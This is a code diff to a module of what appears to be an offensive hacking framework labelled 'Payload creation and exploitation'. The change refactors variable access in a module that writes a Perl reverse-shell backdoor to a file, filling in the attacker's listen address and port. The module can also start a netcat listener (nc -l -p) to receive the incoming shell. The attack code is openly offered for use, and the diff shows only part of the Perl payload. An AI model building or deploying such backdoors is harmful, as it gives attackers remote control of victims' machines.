@@ -9,19 +9,19 @@ info = {
         "description" : "Payload creation and exploitation"
 }
 
-var.lname = ["payload.pl"]
-var.ltype = ["listen"]
+var.all_var['lname'] = "payload.pl"
+var.all_var['ltype'] = "listen"
 
 options ={
-  "LHOST" : [str(var.lhost[0]),'The listen address'],
-  "LPORT" : [str(var.lport[0]),'The listen port'],
-  "LNAME" : [str(var.lname[0]),'The name of payload'],
-  "LTYPE" : [str(var.ltype[0]),'Choose listen or create <listen / create>']
+  "LHOST" : [str(var.all_var['lhost']),'The listen address'],
+  "LPORT" : [str(var.all_var['lport']),'The listen port'],
+  "LNAME" : [str(var.all_var['lname']),'The name of payload'],
+  "LTYPE" : [str(var.all_var['ltype']),'Choose listen or create <listen / create>']
 }
 
 def running():
     try:
-        if var.ltype[0] == "CREATE" or var.ltype[0] == "create":
+        if var.all_var['ltype'].lower() == "create":
             print ("")
             print (blue+"[*]"+default+ "Create a backdour")
             time.sleep(2)
@@ -32,7 +32,7 @@ def running():
             time.sleep(2)
             print ("")
             mark = '"'
-            f = open(var.lname[0] , 'w')
+            f = open(var.all_var['lname'] , 'w')
             payload = """
 
 use strict;
@@ -42,8 +42,8 @@ use POSIX;
 my $VERSION = "1.0";
 
 # Where to send the reverse shell.  Change these.
-my $ip = """ +mark+var.lhost[0]+mark+ """;
-my $port = """+var.lport[0]+""";
+my $ip = """ +mark+var.all_var['lhost']+mark+ """;
+my $port = """+var.all_var['lport']+""";
 
 # Options
 my $daemon = 1;
@@ -127,8 +127,8 @@ Content-Type: text\/html\r\n\r\n" . $global_page;
             f.write(payload)
             f.close()
 
-        elif var.ltype[0] == "LISTEN" or var.ltype[0] == "listen":
-            os.system("nc -l -p "+str(var.lport[0])+" -v")
+        elif var.all_var['ltype'].lower() == "listen":
+            os.system("nc -l -p "+str(var.all_var['lport'])+" -v")
         else:
             print (red+"[-]"+default+"Choose LTYPE " )
     except Exception as e:
